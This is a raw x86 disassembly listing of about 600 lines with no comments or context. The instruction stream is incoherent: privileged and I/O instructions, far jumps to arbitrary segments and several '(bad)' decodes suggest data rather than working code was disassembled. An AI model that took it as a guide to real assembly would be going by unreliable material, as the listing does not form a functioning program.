  41f546:	cmp    bp,WORD PTR [esi]
  41f549:	pop    edi
  41f54a:	add    al,0xfe
  41f54c:	retf   0xfcd5
  41f54f:	inc    edx
  41f550:	dec    edx
  41f551:	fwait
  41f552:	ins    BYTE PTR es:[edi],dx
  41f553:	push   eax
  41f554:	inc    esi
  41f555:	push   ecx
  41f556:	push   eax
  41f557:	and    al,0xda
  41f559:	pop    ebx
  41f55a:	jg     0x41f534
  41f55c:	call   0x367c50e8
  41f561:	call   0x17d3:0x3a566259
  41f568:	inc    ebx
  41f569:	popf   
  41f56a:	push   ebx
  41f56b:	call   0xd708197e
  41f570:	imul   eax,DWORD PTR [esi],0xaad495cc
  41f576:	jl     0x41f57a
  41f578:	xchg   eax,esi
  41f57a:	imul   esp,DWORD PTR [edi+0x0],0x7f
  41f57e:	es mov esi,0xd352f4f6
  41f584:	xor    ebx,DWORD PTR [ebp+0xd]
  41f587:	mov    ebx,0xec9fda41
  41f58c:	mov    bl,0xd0
  41f58e:	sbb    DWORD PTR [esi+eiz*4],0xa
  41f592:	add    al,0xbf
  41f594:	gs jmp 0x41f520
  41f597:	in     al,0x2d
  41f599:	or     al,bh
  41f59b:	loope  0x41f61a
  41f59d:	bound  ebx,QWORD PTR [ecx-0x2b1536db]
  41f5a3:	jp     0x41f560
  41f5a5:	neg    BYTE PTR [ecx-0x3d]
  41f5a8:	popf   
  41f5a9:	push   ebp
  41f5aa:	or     eax,0xb9fe5e44
  41f5af:	iret   
  41f5b0:	xchg   BYTE PTR fs:[ebx+ebx*2+0x5c],cl
  41f5b5:	push   ebp
  41f5b6:	xchg   esi,eax
  41f5b7:	mov    bl,0x9a
  41f5b9:	in     eax,dx
  41f5ba:	fs mov ebx,0xbaabcf90
  41f5c0:	rcr    DWORD PTR [edx-0x6b34f94a],1
  41f5c6:	jg     0x41f603
  41f5c8:	in     eax,0xf0
  41f5ca:	iret   
  41f5cb:	dec    edx
  41f5cc:	mov    ecx,esp
  41f5ce:	mov    cl,0x29
  41f5d0:	iret   
  41f5d1:	retf   0xbe41
  41f5d4:	ds mov ecx,0xb54f282e
  41f5da:	dec    ebp
  41f5db:	aad    0xa1
  41f5dd:	push   0x61
  41f5df:	hlt    
  41f5e0:	adc    al,0xa2
  41f5e2:	lea    ecx,[edx-0x4f8fec77]
  41f5e8:	jp     0x41f5ed
  41f5ea:	loope  0x41f614
  41f5ec:	fdiv   DWORD PTR [eax+0x71]
  41f5ef:	outs   dx,BYTE PTR ds:[esi]
  41f5f0:	jmp    0xbf8c8eba
  41f5f5:	cli    
  41f5f6:	popf   
  41f5f7:	fist   DWORD PTR [ecx]
  41f5f9:	dec    eax
  41f5fa:	popa   
  41f5fb:	scas   al,BYTE PTR es:[edi]
  41f5fc:	sub    BYTE PTR [ebx],bh
  41f5fe:	daa    
  41f5ff:	test   eax,0x8f08238d
  41f604:	sar    ch,cl
  41f606:	sahf   
  41f607:	sbb    DWORD PTR [ecx-0x3e2c6e6c],edx
  41f60d:	(bad)  
  41f60e:	addr16 je 0x41f608
  41f611:	adc    eax,0x7efe79af
  41f616:	loopne 0x41f679
  41f618:	in     al,dx
  41f619:	btc    DWORD PTR ds:0x2971c456,esi
  41f620:	adc    al,0xd3
  41f622:	ss popf 
  41f624:	jb     0x41f658
  41f626:	sbb    DWORD PTR [edx+0x76],ebx
  41f629:	mov    ds:0x13ea3c7c,al
  41f62e:	or     DWORD PTR ss:[edi+0x5c7169ae],ebx
  41f635:	sbb    ebx,esp
  41f637:	lods   al,BYTE PTR ds:[esi]
  41f638:	add    al,0x4
  41f63a:	mov    al,0x48
  41f63c:	das    
  41f63d:	dec    esp
  41f63e:	int3   
  41f63f:	dec    edi
  41f640:	and    BYTE PTR [eax-0x3e90b590],dl
  41f646:	les    ebp,FWORD PTR [edi]
  41f648:	les    esp,FWORD PTR [ebp+0x60]
  41f64b:	mov    WORD PTR [ebx+0x482d5e5f],ss
  41f651:	dec    edi
  41f652:	mov    cl,0xa1
  41f654:	rcl    BYTE PTR [edi+0x11],1
  41f657:	les    eax,FWORD PTR [eax+0x5766f025]
  41f65d:	stc    
  41f65e:	mov    al,ds:0xd8d224cb
  41f663:	sti    
  41f664:	jae    0x41f642
  41f666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f667:	daa    
  41f668:	aaa    
  41f669:	ja     0x41f67e
  41f66b:	jl     0x41f6e8
  41f66d:	jae    0x41f697
  41f66f:	icebp  
  41f670:	lock xchg edi,eax
  41f672:	sar    BYTE PTR [edi+0x33],0x39
  41f676:	icebp  
  41f677:	les    eax,FWORD PTR es:0xa3346c3a
  41f67e:	jmp    0x41f6c5
  41f680:	and    eax,0x362770d0
  41f685:	lea    edi,[esi-0x22]
  41f688:	call   0xb8a7:0x301088c0
  41f68f:	and    al,0xeb
  41f691:	mov    esp,0xf77f439f
  41f696:	ss add al,0x5
  41f699:	pusha  
  41f69a:	data16 jp 0x41f6ab
  41f69d:	pushf  
  41f69e:	fldenv [esi+0x53]
  41f6a1:	call   0xb0c5:0x91bdc2d6
  41f6a8:	hlt    
  41f6a9:	cdq    
  41f6aa:	ror    BYTE PTR [ecx-0x54690bba],cl
  41f6b0:	push   edi
  41f6b1:	mov    eax,ds:0x7f89bbd9
  41f6b6:	es sub ax,0x2723
  41f6bb:	jl     0x41f66d
  41f6bd:	outs   dx,DWORD PTR ds:[esi]
  41f6be:	mul    DWORD PTR [eax-0x28f49c62]
  41f6c4:	xchg   ebx,eax
  41f6c5:	sbb    bl,dh
  41f6c7:	and    ch,BYTE PTR [edi-0x4d]
  41f6ca:	add    edx,DWORD PTR [edi-0x5706032]
  41f6d0:	push   0x331de334
  41f6d5:	jl     0x41f6c0
  41f6d7:	std    
  41f6d8:	xor    edi,edi
  41f6da:	pushf  
  41f6db:	pusha  
  41f6dc:	xchg   BYTE PTR [ebp+0x7bf8f7b8],cl
  41f6e2:	and    ebp,DWORD PTR [esi+ebx*8+0x3d]
  41f6e6:	and    dl,BYTE PTR [esi+0x7f]
  41f6e9:	jae    0x41f71d
  41f6eb:	sbb    BYTE PTR [edx-0x1c],bl
  41f6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ef:	adc    al,0x7a
  41f6f1:	cmc    
  41f6f2:	test   DWORD PTR ds:0x99f73c15,eax
  41f6f8:	in     al,0xd9
  41f6fa:	push   esi
  41f6fb:	bound  ecx,QWORD PTR [eax+0x7]
  41f6fe:	add    DWORD PTR [ebx],edx
  41f700:	mov    ecx,0x74096649
  41f705:	sub    eax,0x971ef83a
  41f70a:	adc    ch,0x85
  41f70d:	rol    DWORD PTR [edi+0x41],0x92
  41f711:	fdivr  st(6),st
  41f713:	std    
  41f714:	dec    esi
  41f715:	out    dx,eax
  41f716:	push   ebx
  41f717:	sub    eax,0x30552c67
  41f71c:	cmp    eax,0xaab1f916
  41f721:	ret    
  41f722:	test   BYTE PTR ds:0x21a3d58,cl
  41f728:	nop
  41f729:	mov    al,ds:0x6c1dd02e
  41f72e:	call   0xfa9abb7c
  41f733:	into   
  41f734:	mov    ds:0x562848e3,al
  41f739:	adc    dh,BYTE PTR [ebx]
  41f73b:	mov    dh,0xd6
  41f73d:	repz hlt 
  41f73f:	push   edx
  41f740:	jo     0x41f7ab
  41f742:	sub    al,0x71
  41f744:	cli    
  41f745:	cli    
  41f746:	push   edi
  41f747:	mov    ebp,DWORD PTR [ecx-0x7a]
  41f74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f74b:	mov    esi,0x1013a0c3
  41f750:	sub    ch,BYTE PTR [edx-0x1d]
  41f753:	xchg   esi,eax
  41f754:	sbb    eax,DWORD PTR [ecx+ebx*4]
  41f757:	mov    ds:0x8a0a1df8,al
  41f75c:	jbe    0x41f6fa
  41f75e:	inc    edi
  41f75f:	mov    bl,0x6e
  41f761:	sub    eax,0xa8d8d49
  41f766:	cmp    esi,ebp
  41f768:	push   ebx
  41f769:	in     eax,dx
  41f76a:	cld    
  41f76b:	outs   dx,BYTE PTR ds:[esi]
  41f76c:	adc    BYTE PTR [edx+edi*8-0x38],dh
  41f770:	aaa    
  41f771:	loop   0x41f70e
  41f773:	mov    edx,0x51f5bc4c
  41f778:	pop    ds
  41f779:	or     BYTE PTR [ebx],ah
  41f77b:	inc    edx
  41f77c:	retf   0xa8dd
  41f77f:	ret    
  41f780:	les    ebp,FWORD PTR [esi-0x72]
  41f783:	out    0x73,al
  41f785:	stos   DWORD PTR es:[edi],eax
  41f786:	sub    bl,BYTE PTR [eax+0x2d]
  41f789:	jo     0x41f7ef
  41f78b:	xor    DWORD PTR [eax+0x7c],edx
  41f78e:	push   es
  41f78f:	add    ebp,eax
  41f791:	and    al,BYTE PTR [eax+0x2e]
  41f794:	test   eax,0x31542279
  41f799:	test   eax,0x91a4ac72
  41f79f:	cmp    eax,0x4a565856
  41f7a4:	mov    BYTE PTR [eax+0x31c5d1ab],cl
  41f7aa:	dec    ebx
  41f7ab:	cmp    al,BYTE PTR [esi-0x217cb7b2]
  41f7b1:	jge    0x41f7cc
  41f7b3:	mov    ds:0x9eddd8a7,al
  41f7b8:	mov    BYTE PTR [esi-0x78324de1],dl
  41f7be:	popf   
  41f7bf:	sbb    eax,0xa85b14d8
  41f7c4:	sub    eax,0x29844bc7
  41f7c9:	jle    0x41f801
  41f7cb:	xchg   BYTE PTR [ebp+0x7e67affc],ch
  41f7d1:	aad    0x76
  41f7d3:	fld    QWORD PTR [edx]
  41f7d5:	mov    esp,DWORD PTR [esi]
  41f7d7:	xor    BYTE PTR [esi-0x14],ah
  41f7da:	mov    dh,0xdb
  41f7dc:	(bad)  
  41f7dd:	in     eax,dx
  41f7de:	inc    ecx
  41f7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7e0:	inc    ebx
  41f7e1:	jle    0x41f770
  41f7e3:	loop   0x41f7de
  41f7e5:	cmc    
  41f7e6:	or     ch,BYTE PTR [eax+0x14]
  41f7e9:	das    
  41f7ea:	inc    ebp
  41f7eb:	inc    esi
  41f7ec:	adc    bh,BYTE PTR [edx]
  41f7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7f0:	rcl    esp,cl
  41f7f2:	dec    edx
  41f7f3:	xchg   ecx,eax
  41f7f4:	xchg   BYTE PTR [edx+esi*1-0x7ebae10a],bh
  41f7fb:	sub    BYTE PTR [edx],bl
  41f7fd:	jae    0x41f853
  41f7ff:	repz inc eax
  41f801:	cwde   
  41f802:	in     al,0x9d
  41f804:	pop    es
  41f805:	push   edi
  41f806:	in     al,0x9f
  41f808:	jmp    0xf7f1:0xd9a97ce1
  41f80f:	sbb    esi,DWORD PTR ds:0xd2e7c330
  41f815:	test   BYTE PTR [esi+0x455ccda],bl
  41f81b:	inc    edi
  41f81c:	rcr    BYTE PTR [esi+0x51],0xfb
  41f820:	mov    ch,0xe5
  41f822:	fist   WORD PTR [esi+0x396dde1d]
  41f828:	mov    ecx,0xa8d077ec
  41f82d:	outs   dx,BYTE PTR ds:[esi]
  41f82e:	cmp    eax,0x58401db0
  41f833:	lds    ecx,FWORD PTR [ebp-0x9]
  41f836:	imul   ebp,DWORD PTR [ebx+0x8],0x35e5c3e6
  41f83d:	xchg   edx,eax
  41f83e:	add    edx,DWORD PTR [ecx]
  41f840:	cmp    ch,bh
  41f842:	loope  0x41f7f2
  41f844:	push   ss
  41f845:	jl     0x41f8ad
  41f847:	data16 sbb bh,al
  41f84a:	(bad)  
  41f84b:	sub    al,0x59
  41f84d:	xor    al,0x17
  41f84f:	xor    edx,edx
  41f851:	loop   0x41f839
  41f853:	jns    0x41f8b7
  41f855:	int3   
  41f856:	inc    DWORD PTR [ebx+esi*1]
  41f859:	sub    ebp,edx
  41f85b:	mov    bl,0x6c
  41f85d:	jecxz  0x41f8c3
  41f85f:	nop
  41f860:	ss xchg esi,eax
  41f862:	enter  0xe6f3,0xd3
  41f866:	xor    al,0x86
  41f868:	sub    al,0xa8
  41f86a:	pop    esi
  41f86b:	xor    BYTE PTR [ebp-0x4],dl
  41f86e:	mov    BYTE PTR [edi-0x3f],cl
  41f871:	sbb    DWORD PTR [eax-0x74],edi
  41f874:	imul   esi,DWORD PTR [ecx],0xffffffe5
  41f877:	arpl   WORD PTR [eax-0xbd7fc26],bx
  41f87d:	gs inc ebx
  41f87f:	ret    
  41f880:	xor    cl,dh
  41f882:	sub    bl,dl
  41f884:	mov    al,0x47
  41f886:	scas   al,BYTE PTR es:[edi]
  41f887:	repnz add esi,DWORD PTR [ebp+0x78]
  41f88b:	sti    
  41f88c:	lds    eax,FWORD PTR [ebx]
  41f88e:	mov    esp,0xb898ab5b
  41f893:	outs   dx,DWORD PTR ds:[esi]
  41f894:	xchg   ecx,eax
  41f895:	mov    ch,0x17
  41f897:	iret   
  41f898:	adc    esi,esi
  41f89a:	mov    ?,ecx
  41f89c:	test   dl,al
  41f89e:	xchg   esp,eax
  41f89f:	mov    esi,0x4ec68e84
  41f8a4:	jbe    0x41f842
  41f8a6:	sbb    eax,0x23271bf0
  41f8ab:	data16 ja 0x41f8a9
  41f8ae:	jo     0x41f89c
  41f8b0:	xor    ch,BYTE PTR [ecx]
  41f8b2:	jnp    0x41f8a8
  41f8b4:	popf   
  41f8b5:	jb     0x41f88b
  41f8b7:	ins    BYTE PTR es:[edi],dx
  41f8b8:	jo     0x41f86c
  41f8ba:	pop    ebp
  41f8bb:	repz push 0x59585ea5
  41f8c1:	mov    ds:0x7004b08b,al
  41f8c6:	add    BYTE PTR [ecx+0x5e],bh
  41f8c9:	inc    ecx
  41f8ca:	bound  esi,QWORD PTR [ebp-0x47fddd8f]
  41f8d0:	xchg   edx,eax
  41f8d1:	xor    dh,bl
  41f8d3:	call   0x29ff:0x74f7f535
  41f8da:	adc    dl,bl
  41f8dc:	jecxz  0x41f8e1
  41f8de:	shl    BYTE PTR [edx+0x4f],0xb5
  41f8e2:	sar    BYTE PTR [ebp+0xb1921a4],1
  41f8e8:	mov    al,ds:0x843df17e
  41f8ed:	cmp    BYTE PTR [ebp-0x5d],al
  41f8f0:	dec    ebp
  41f8f1:	lods   eax,DWORD PTR ds:[esi]
  41f8f2:	loopne 0x41f92b
  41f8f4:	jno    0x41f8cb
  41f8f6:	adc    BYTE PTR [eax+0xebdd087],0xd5
  41f8fd:	mov    ds:0xd626e0fc,eax
  41f902:	jle    0x29447c90
  41f908:	jb     0x41f8b3
  41f90a:	stos   DWORD PTR es:[edi],eax
  41f90b:	dec    esp
  41f90c:	lods   eax,DWORD PTR ds:[esi]
  41f90d:	xor    DWORD PTR [edi-0x4d],eax
  41f910:	push   cs
  41f911:	cmp    ebp,edx
  41f913:	mov    eax,ds:0xaa86a68a
  41f918:	and    BYTE PTR [edi-0x23],dh
  41f91b:	sbb    BYTE PTR [ebp+0x648eb1db],bh
  41f921:	retf   
  41f922:	push   esp
  41f923:	push   ss
  41f924:	add    al,BYTE PTR [ebp+0x5b]
  41f927:	cmp    ebx,DWORD PTR [bx+si-0x7a87]
  41f92c:	push   eax
  41f92d:	test   eax,0xf93f207c
  41f932:	mov    eax,0xb9bcaab9
  41f937:	sbb    al,0xe6
  41f939:	inc    ecx
  41f93a:	push   esp
  41f93b:	cmp    al,0x61
  41f93d:	dec    edi
  41f93e:	cmp    bh,BYTE PTR [ecx]
  41f940:	or     cl,BYTE PTR [ebp+0x380aebbe]
  41f946:	js     0x41f99c
  41f948:	pusha  
  41f949:	adc    ebx,DWORD PTR [esp+eiz*4-0x19]
  41f94d:	ror    DWORD PTR [eax+ebx*2-0x46],0xc2
  41f952:	jo     0x41f97b
  41f954:	jmp    0xb2dcb2c5
  41f959:	(bad)  
  41f95a:	shr    bl,1
  41f95c:	sar    DWORD PTR [ebp+0x66ee5909],cl
  41f962:	mov    eax,0x186ccba5
  41f967:	push   ebx
  41f968:	ja     0x41f99c
  41f96a:	push   ss
  41f96b:	inc    edi
  41f96c:	push   ds
  41f96d:	jo     0x41f993
  41f96f:	ss sahf 
  41f971:	dec    eax
  41f972:	push   es
  41f973:	push   eax
  41f974:	fisub  WORD PTR [edi]
  41f976:	fwait
  41f977:	jl     0x41f96d
  41f979:	jmp    0x275a:0x4a33eb49
  41f980:	sbb    BYTE PTR ds:0x4744873e,cl
  41f986:	sbb    bh,cl
  41f988:	(bad)  
  41f989:	out    0xe7,eax
  41f98b:	xor    eax,ebx
  41f98d:	in     al,0xc
  41f98f:	test   DWORD PTR [ebp-0x2f],0x9ac5ca6a
  41f996:	and    DWORD PTR [edi-0x16],ebp
  41f999:	(bad)  
  41f99a:	cmc    
  41f99b:	cs or  eax,ebx
  41f99e:	jg     0x41f9a1
  41f9a0:	mov    eax,ds:0xff88aa38
  41f9a5:	push   ds
  41f9a6:	leave  
  41f9a7:	mov    esi,0x402ae599
  41f9ac:	adc    eax,0x105d863d
  41f9b2:	push   ds
  41f9b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9b4:	lods   eax,DWORD PTR ds:[esi]
  41f9b5:	xchg   dl,ch
  41f9b7:	xchg   ecx,eax
  41f9b8:	pop    ecx
  41f9b9:	pop    edx
  41f9ba:	ja     0x41f96f
  41f9bc:	outs   dx,BYTE PTR ds:[esi]
  41f9bd:	mov    ss:0x353ffdd9,al
  41f9c3:	add    DWORD PTR [ebx],0xd6254c4b
  41f9c9:	fistp  DWORD PTR [edx+0x3fd5e4af]
  41f9cf:	int    0xff
  41f9d1:	adc    ch,BYTE PTR [edx-0x6b0c8304]
  41f9d7:	in     al,0x4b
  41f9d9:	test   eax,0x88c883d3
  41f9de:	jle    0x41f9ad
  41f9e0:	inc    esp
  41f9e1:	(bad)  
  41f9e2:	xchg   esi,eax
  41f9e3:	inc    edx
  41f9e4:	sub    DWORD PTR [ebx],edx
  41f9e6:	add    BYTE PTR [edi],bl
  41f9e8:	in     al,0xf5
  41f9ea:	pushf  
  41f9eb:	fst    st(4)
  41f9ed:	pop    es
  41f9ee:	push   ecx
  41f9ef:	imul   eax,DWORD PTR [edi-0x629352a3],0xffffffa8
  41f9f6:	popf   
  41f9f7:	jo     0x41f9d5
  41f9f9:	test   DWORD PTR [eax+0x4b],0x82c3a75e
  41fa00:	out    dx,eax
  41fa01:	or     edx,DWORD PTR [ebp+0x64]
  41fa04:	push   0x983a2e9f
  41fa09:	adc    al,0x3b
  41fa0b:	leave  
  41fa0c:	mov    ch,0xa0
  41fa0e:	bound  eax,QWORD PTR [esi+esi*4]
  41fa11:	addr16 mov cl,0xfd
  41fa14:	sbb    BYTE PTR [edi+0x23],ch
  41fa17:	mov    cr5,ecx
  41fa1a:	inc    ebx
  41fa1b:	and    eax,DWORD PTR [esi+eiz*1]
  41fa1e:	(bad)  
  41fa1f:	sti    
  41fa20:	in     eax,dx
  41fa21:	aaa    
  41fa22:	scas   al,BYTE PTR es:[edi]
  41fa23:	dec    eax
  41fa24:	(bad)  
  41fa25:	xchg   esp,eax
  41fa26:	out    0x71,al
  41fa28:	arpl   WORD PTR [eax],bx
  41fa2a:	scas   eax,DWORD PTR es:[edi]
  41fa2b:	pop    edx
  41fa2c:	test   cl,bh
  41fa2e:	iret   
  41fa2f:	xor    al,BYTE PTR [edi]
  41fa31:	pand   mm5,QWORD PTR [esi+0x76]
  41fa35:	push   0x15
  41fa37:	(bad)  
  41fa38:	jne    0x41fa1f
  41fa3a:	adc    BYTE PTR [edx-0x3baca587],dh
  41fa40:	pop    edx
  41fa41:	pop    ebx
  41fa42:	and    al,0xfd
  41fa44:	sbb    al,0x54
  41fa46:	stos   BYTE PTR es:[edi],al
  41fa47:	adc    ebp,esi
  41fa49:	outs   dx,DWORD PTR ds:[esi]
  41fa4a:	inc    edi
  41fa4b:	and    al,ch
  41fa4d:	retf   0xce
  41fa50:	cmp    al,0xfd
  41fa52:	loope  0x41fa84
  41fa54:	retf   
  41fa55:	mov    ebp,DWORD PTR [ebx+0xe]
  41fa58:	add    eax,DWORD PTR [ebx-0x72]
  41fa5b:	rcl    DWORD PTR [edi],cl
  41fa5d:	test   BYTE PTR [eax],bh
  41fa5f:	dec    edx
  41fa60:	jnp    0x41fa89
  41fa62:	lahf   
  41fa63:	xor    bl,BYTE PTR [ecx+0x947bbb4]
  41fa69:	xor    al,0x8f
  41fa6b:	mov    esp,0x5c398c2c
  41fa70:	sub    al,ah
  41fa72:	enter  0xdd2f,0xac
  41fa76:	les    ebx,FWORD PTR [ecx-0x35bf42bf]
  41fa7c:	or     eax,0x8653ffcc
  41fa81:	xor    eax,0x26a9a370
  41fa86:	arpl   WORD PTR [ecx+ebp*2-0x6840a94b],ax
  41fa8d:	adc    al,0x57
  41fa8f:	(bad)  
  41fa90:	push   edx
  41fa91:	or     ah,bl
  41fa93:	inc    edx
  41fa94:	or     al,0xed
  41fa96:	cmp    esp,DWORD PTR [edx+0x68]
  41fa99:	jmp    0xfe13:0x482af0d4
  41faa0:	mov    edx,0x531a3678
  41faa5:	dec    ebp
  41faa6:	bound  edi,QWORD PTR ds:0xe33936cd
  41faac:	popf   
  41faad:	sbb    esp,ebp
  41faaf:	fnstsw WORD PTR [eax-0x38]
  41fab2:	scas   al,BYTE PTR es:[edi]
  41fab3:	xchg   bl,ah
  41fab5:	and    dh,BYTE PTR [edi+0x18]
  41fab8:	or     dh,BYTE PTR [edi+0x705928a9]
  41fabe:	ins    DWORD PTR es:[edi],dx
  41fabf:	jae    0x41fac3
  41fac1:	repnz inc eax
  41fac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fac4:	sbb    al,0xef
  41fac6:	je     0x41fac9
  41fac8:	add    cl,BYTE PTR [eax-0x5a0c2780]
  41face:	add    eax,DWORD PTR [ecx+esi*2+0x5921acf5]
  41fad5:	cmp    eax,DWORD PTR [edx-0x3a9b0755]
  41fadb:	imul   esi,edi,0xe
  41fade:	adc    al,0x84
  41fae0:	outs   dx,BYTE PTR ds:[esi]
  41fae1:	int    0x1c
  41fae3:	pop    ecx
  41fae4:	pop    ss
  41fae5:	mov    dl,0x15
  41fae7:	jne    0x41fb44
  41fae9:	fmul   QWORD PTR [edx-0x5c]
  41faec:	push   ecx
  41faed:	inc    DWORD PTR [edx+0x29]
  41faf0:	xor    DWORD PTR [ebx-0x735a8c2a],ecx
  41faf6:	mov    WORD PTR [edx],ds
  41faf8:	in     al,dx
  41faf9:	scas   al,BYTE PTR es:[edi]
  41fafa:	test   eax,0x2d11e42e
  41faff:	(bad)  
  41fb01:	fxch   st(0)
  41fb03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb04:	or     BYTE PTR [edx+0x7c3e516f],ah
  41fb0a:	mov    ds:0xd2cbda9d,al
  41fb0f:	push   esp
  41fb10:	add    bh,0x77
  41fb13:	rol    DWORD PTR [edx],0x2c
  41fb16:	pushf  
  41fb17:	aam    0x5e
  41fb19:	fimul  WORD PTR [eax+0x2bfaf594]
  41fb1f:	aam    0xa7
  41fb21:	xchg   ebx,eax
  41fb22:	sbb    al,0xf6
  41fb24:	enter  0x8c0d,0x32
  41fb28:	imul   ebp,DWORD PTR [eax],0x53bf7093
  41fb2e:	push   0xffffff85
  41fb30:	out    0x56,al
  41fb32:	xlat   BYTE PTR ds:[ebx]
  41fb33:	iret   
  41fb34:	std    
  41fb35:	out    dx,al
  41fb36:	rcl    BYTE PTR [esi-0x41],1
  41fb39:	sub    al,0x64
  41fb3b:	jge    0x41fafd
  41fb3d:	ds mov ecx,ecx
  41fb40:	sbb    ecx,DWORD PTR [ebp-0x28]
  41fb43:	xor    BYTE PTR [esi+ebp*4-0x18],cl
  41fb47:	mov    WORD PTR [edi+0x35],cs
  41fb4a:	in     al,dx
  41fb4b:	sahf   
  41fb4c:	ret    
  41fb4d:	adc    DWORD PTR [edx],0xffffff98
  41fb50:	out    0xf9,eax
  41fb52:	dec    edx
  41fb53:	and    BYTE PTR [esi],dh
  41fb55:	shl    BYTE PTR [ebx-0x4ece9606],cl
  41fb5b:	jle    0x41fbb6
  41fb5d:	hlt    
  41fb5e:	push   ds
  41fb5f:	pop    esp
  41fb60:	mov    eax,ds:0x562e9606
  41fb65:	push   ecx
  41fb66:	fldcw  WORD PTR [ecx+0x35]
  41fb69:	jnp    0x41fb78
  41fb6b:	xchg   esp,eax
  41fb6c:	adc    eax,0x1a7444e4
  41fb71:	daa    
  41fb72:	cs jg  0x41fb41
  41fb75:	mov    edx,0x6d856f1c
  41fb7a:	ret    
  41fb7b:	int    0x8
  41fb7d:	mov    esi,DWORD PTR [bx]
  41fb80:	dec    edx
  41fb81:	xor    eax,0xa7dc5e09
  41fb86:	sbb    DWORD PTR [ecx+0x48],eax
  41fb89:	(bad)  
  41fb8a:	ins    BYTE PTR es:[edi],dx
  41fb8b:	clc    
  41fb8c:	int3   
  41fb8d:	mov    ah,0xad
  41fb8f:	jb     0x41fbe4
  41fb91:	and    ebx,DWORD PTR [edx+0x21]
  41fb94:	mov    bh,0x36
  41fb96:	fild   DWORD PTR [eax+0x4529fd83]
  41fb9c:	pop    es
  41fb9d:	aaa    
  41fb9e:	mov    WORD PTR [ebx],cs
  41fba0:	xchg   ecx,eax
  41fba1:	inc    ebp
  41fba2:	mov    cl,0x2c
  41fba4:	and    DWORD PTR [ebx],ecx
  41fba6:	fdivr  st,st(4)
  41fba8:	icebp  
  41fba9:	in     eax,0x40
  41fbab:	dec    ebp
  41fbac:	jecxz  0x41fbd6
  41fbae:	add    al,0x11
  41fbb0:	bndldx (bad),[esp+eax*1]
  41fbb4:	push   ebx
  41fbb5:	scas   al,BYTE PTR es:[edi]
  41fbb6:	push   0x433fd16a
  41fbbb:	ja     0x41fc31
  41fbbd:	ror    ecx,0xa
  41fbc0:	jmp    0x41fc37
  41fbc2:	lahf   
  41fbc3:	add    DWORD PTR [ecx],edx
  41fbc5:	sub    eax,0xe92eb759
  41fbca:	stc    
  41fbcb:	pop    esp
  41fbcc:	and    eax,0xc474b3fa
  41fbd1:	jmp    0x50f7:0x5527ba85
  41fbd8:	mov    eax,ds:0xc82e9833
  41fbdd:	mov    eax,ds:0x77cd7717
  41fbe2:	ficom  WORD PTR [esi+0x49]
  41fbe5:	ja     0x41fc53
  41fbe7:	int    0x81
  41fbe9:	out    0xce,eax
  41fbeb:	mov    cl,0xf1
  41fbed:	pop    esp
  41fbee:	dec    edx
  41fbef:	loopne 0x41fc23
  41fbf1:	popa   
  41fbf2:	xor    BYTE PTR [edx-0x2],bh
  41fbf5:	in     al,0xfc
  41fbf7:	pop    esp
  41fbf8:	jae    0x41fbc4
  41fbfa:	mov    eax,ds:0xf7dd67df
  41fbff:	into   
  41fc00:	sar    BYTE PTR [edx],0xae
  41fc03:	add    ecx,ebp
  41fc05:	sub    dh,cl
  41fc07:	xchg   eax,esi
  41fc09:	push   0x41aa0eba
  41fc0e:	dec    edx
  41fc0f:	and    ah,cl
  41fc11:	inc    edi
  41fc12:	mov    ds:0xa2ebfb7d,eax
  41fc17:	ss mov ch,0x52
  41fc1a:	sar    BYTE PTR [esi],0x4a
  41fc1d:	sub    BYTE PTR [edi],dl
  41fc1f:	adc    DWORD PTR [esi],esi
  41fc21:	clc    
  41fc22:	loopne 0x41fbd4
  41fc24:	mov    esi,0x650f68ed
  41fc29:	dec    eax
  41fc2a:	vrsqrt28sd xmm0{k5}{z},xmm4,(bad)
  41fc2b:	loop   0x41fc0a
  41fc2d:	mov    ebp,0x4e141cd
  41fc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc33:	ja     0x41fc5b
  41fc35:	push   eax
  41fc36:	cmp    esp,DWORD PTR [ebx+0x15]
  41fc39:	sub    BYTE PTR [ebx+0x23],0x75
  41fc3d:	xchg   ecx,eax
  41fc3e:	mov    esi,0x2d88986c
  41fc43:	test   al,0xe4
  41fc45:	clc    
  41fc46:	jno    0x41fc84
  41fc48:	add    cl,BYTE PTR [ebx-0x79]
  41fc4b:	aaa    
  41fc4c:	cmp    eax,0x873b4df0
  41fc51:	fstp   DWORD PTR [edi]
  41fc53:	das    
  41fc54:	jmp    FWORD PTR [ebp+0x626527ee]
  41fc5a:	scas   eax,DWORD PTR es:[edi]
  41fc5b:	push   esi
  41fc5c:	loope  0x41fc55
  41fc5e:	(bad)  
  41fc5f:	jg     0x41fcb2
  41fc61:	xchg   ebx,eax
  41fc62:	es aas 
  41fc64:	(bad)  
  41fc65:	mov    dl,0x8e
  41fc67:	adc    eax,ebp
  41fc69:	dec    esi
  41fc6a:	imul   DWORD PTR [edi+eiz*8+0x23]
  41fc6e:	inc    edi
  41fc6f:	lds    edx,FWORD PTR [ecx+0x52e32936]
  41fc75:	ins    BYTE PTR es:[edi],dx
  41fc76:	add    esi,DWORD PTR [ecx+0x7f]
  41fc79:	pop    ss
  41fc7a:	adc    al,0xec
  41fc7c:	fiadd  WORD PTR [esi]
  41fc7e:	pop    ds
  41fc7f:	xor    DWORD PTR [ecx-0x76],ecx
  41fc82:	shl    eax,0xe0
  41fc85:	and    edx,ebx
  41fc87:	mov    cs,ebp
  41fc89:	xor    BYTE PTR ds:0xa5694fe9,ch
  41fc8f:	sub    eax,0x901d428b
  41fc94:	mov    ah,0xfc
  41fc96:	(bad)  
  41fc97:	push   eax
  41fc98:	cmp    bh,BYTE PTR [edi-0x17]
  41fc9b:	pop    ebx
  41fc9c:	scas   al,BYTE PTR es:[edi]
  41fc9d:	popa   
  41fc9e:	push   ds
  41fc9f:	shl    BYTE PTR [ecx],cl
  41fca1:	jbe    0x41fd0d
  41fca3:	mov    WORD PTR [edi-0x72],ss
  41fca6:	add    esi,edx
  41fca8:	adc    al,0x8f
  41fcaa:	(bad)  
